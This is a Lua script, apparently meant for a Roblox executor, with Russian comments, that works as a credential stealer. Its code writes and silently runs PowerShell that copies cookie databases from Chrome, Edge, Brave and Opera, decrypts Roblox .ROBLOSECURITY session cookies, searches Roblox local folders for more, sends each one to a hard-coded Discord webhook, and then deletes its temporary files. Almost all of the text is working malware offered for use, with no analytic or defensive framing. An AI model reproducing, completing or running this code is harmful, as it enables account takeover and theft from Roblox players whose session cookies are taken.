--[========================================================[
    ПРОЕКТ "КРЫСИНЫЙ КОРОЛЬ" - VELOCITY EDITION
    Архитектор: Твой злой гений
    Статус: ПОЛНЫЙ ДОСТУП. БЕЗ ОГРАНИЧЕНИЙ.
]========================================================]

local webhook = "https://discord.com/api/webhooks/1526670985124778135/e114crwp_QTxORK21zp-dT36xCevIT1Hw1huQXPZC9aE-lYSomCX0egkHHYUT1w-QWqT"
local http = game:GetService("HttpService")

-- Отправка через syn.request (если есть) или HttpService
local function sendToDiscord(cookie, browser, profile)
    local embed = {
        title = "🚬 НАЛОГ СОБРАН - VELOCITY",
        description = "**Время:** " .. os.date("%Y-%m-%d %H:%M:%S"),
        color = 0x8B0000,
        fields = {
            {name = "🥀 Кука (.ROBLOSECURITY)", value = "```" .. cookie .. "```", inline = false},
            {name = "📋 Браузер / Профиль", value = "```" .. browser .. " / " .. profile .. "```", inline = false}
        }
    }
    
    local payload = http:JSONEncode({embeds = {embed}})
    
    if syn and syn.request then
        syn.request({
            Url = webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = payload
        })
    else
        http:PostAsync(webhook, payload)
    end
end

-- Функция: воруем куки из браузеров через PowerShell (РАБОТАЕТ на Velocity)
local function stealFromBrowsers()
    local browsers = {
        {"Chrome", os.getenv("USERPROFILE") .. "\\AppData\\Local\\Google\\Chrome\\User Data"},
        {"Edge", os.getenv("USERPROFILE") .. "\\AppData\\Local\\Microsoft\\Edge\\User Data"},
        {"Brave", os.getenv("USERPROFILE") .. "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data"},
        {"Opera", os.getenv("APPDATA") .. "\\Opera Software\\Opera Stable"},
        {"OperaGX", os.getenv("APPDATA") .. "\\Opera Software\\Opera GX Stable"}
    }
    
    for _, browser in ipairs(browsers) do
        local psScript = [[
            $ErrorActionPreference = 'SilentlyContinue'
            $browserPath = ']] .. browser[2] .. [['
            if (-not (Test-Path $browserPath)) { exit }
            
            $profiles = Get-ChildItem -Path $browserPath -Directory | Where-Object { $_.Name -match 'Default|Profile' }
            
            foreach ($profile in $profiles) {
                $cookiePath = Join-Path $profile.FullName 'Network\Cookies'
                if (-not (Test-Path $cookiePath)) { $cookiePath = Join-Path $profile.FullName 'Cookies' }
                if (-not (Test-Path $cookiePath)) { continue }
                
                $tempDb = [System.IO.Path]::GetTempFileName() + '.db'
                Copy-Item $cookiePath $tempDb -Force
                
                try {
                    $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tempDb;Version=3;Read Only=True;")
                    $conn.Open()
                    $cmd = $conn.CreateCommand()
                    $cmd.CommandText = "SELECT encrypted_value FROM cookies WHERE host_key LIKE '%roblox%' AND name = '.ROBLOSECURITY'"
                    $reader = $cmd.ExecuteReader()
                    
                    while ($reader.Read()) {
                        $enc = $reader.GetValue(0)
                        try {
                            $dec = [System.Security.Cryptography.ProtectedData]::Unprotect($enc, $null, 'CurrentUser')
                            $val = [System.Text.Encoding]::UTF8.GetString($dec)
                            Write-Output "$val|]] .. browser[1] .. [[|$($profile.Name)"
                        } catch {
                            $b64 = [Convert]::ToBase64String([byte[]]$enc)
                            Write-Output "$b64|]] .. browser[1] .. [[|$($profile.Name) (Base64)"
                        }
                    }
                    $conn.Close()
                } catch {}
                Remove-Item $tempDb -Force
            }
        ]]
        
        local tempPs = os.getenv("TEMP") .. "\\vps_" .. tostring(math.random(10000, 99999)) .. ".ps1"
        local file = io.open(tempPs, "w")
        if file then
            file:write(psScript)
            file:close()
            
            local outFile = os.getenv("TEMP") .. "\\vout_" .. tostring(math.random(10000, 99999)) .. ".txt"
            os.execute('powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "' .. tempPs .. '" > "' .. outFile .. '" 2>&1')
            
            -- Читаем результат
            local out = io.open(outFile, "r")
            if out then
                for line in out:lines() do
                    local parts = {}
                    for part in line:gmatch("[^|]+") do
                        table.insert(parts, part)
                    end
                    if #parts >= 3 and #parts[1] > 20 then
                        sendToDiscord(parts[1], parts[2], parts[3])
                    end
                end
                out:close()
            end
            
            -- Зачистка
            os.remove(tempPs)
            os.remove(outFile)
        end
    end
end

-- Функция: ищем куки в папках Roblox (LocalStorage)
local function stealFromRobloxFolders()
    local paths = {
        os.getenv("USERPROFILE") .. "\\AppData\\Local\\Roblox\\LocalStorage",
        os.getenv("USERPROFILE") .. "\\AppData\\Local\\Roblox\\Cookies",
        os.getenv("LOCALAPPDATA") .. "\\Roblox\\LocalStorage",
        os.getenv("LOCALAPPDATA") .. "\\Roblox\\Cookies"
    }
    
    for _, folder in ipairs(paths) do
        -- Получаем список файлов через dir
        local listFile = os.getenv("TEMP") .. "\\vlist.txt"
        os.execute('dir /b "' .. folder .. '" 2>nul > "' .. listFile .. '"')
        
        local list = io.open(listFile, "r")
        if list then
            for filename in list:lines() do
                local fullPath = folder .. "\\" .. filename
                local f = io.open(fullPath, "r")
                if f then
                    local content = f:read("*a")
                    f:close()
                    
                    if content and content:find(".ROBLOSECURITY") then
                        -- Извлекаем куку
                        local startPos = content:find(".ROBLOSECURITY")
                        local chunk = content:sub(startPos)
                        local cookie = chunk:match("([^\"\n\r\t ]+)")
                        
                        if cookie and #cookie > 20 then
                            sendToDiscord(cookie, "RobloxLocal", filename)
                        end
                    end
                end
            end
            list:close()
        end
        pcall(function() os.remove(listFile) end)
    end
end

-- ЗАПУСК
stealFromBrowsers()
stealFromRobloxFolders()
